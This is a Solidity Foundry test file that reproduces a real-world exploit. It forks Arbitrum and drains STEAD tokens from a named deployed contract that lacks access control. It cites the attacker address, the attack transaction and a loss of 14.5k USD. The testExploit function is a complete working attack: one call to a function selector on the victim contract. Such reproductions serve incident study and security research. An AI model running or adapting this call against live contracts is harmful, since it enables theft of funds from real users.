// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 14.5k USD
// Attacker : https://arbiscan.io/address/0x5fb0b8584b34e56e386941a65dbe455ad43c5a23
// Attack Contract : N/A
// Vulnerable Contract : https://arbiscan.io/address/0xf9FF933f51bA180a474634440a406c95DfB27596
// Attack Tx : https://arbiscan.io/tx/0x32dbfce2253002498cd41a2d79e249250f92673bc3de652f3919591ee26e8001

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xf9FF933f51bA180a474634440a406c95DfB27596#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1939508301596672036
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant STEAD = 0x42F4e5Fcd12D59e879dbcB908c76032a4fb0303b;
address constant VICTIM = 0xf9FF933f51bA180a474634440a406c95DfB27596;

contract Contractf9ff is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 352509408 - 1;

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        fundingToken = STEAD;
    }

    function testExploit() public balanceLog {
        // The contract 0xf9ff lacks proper access control, allowing any to drain STEAD tokens from the contract.
        bytes4 selector = 0x16fb27ce;
        (bool success, ) = VICTIM.call(abi.encodePacked(selector, abi.encode(1, 1, 1)));
        require(success, "Call failed");
    }
}
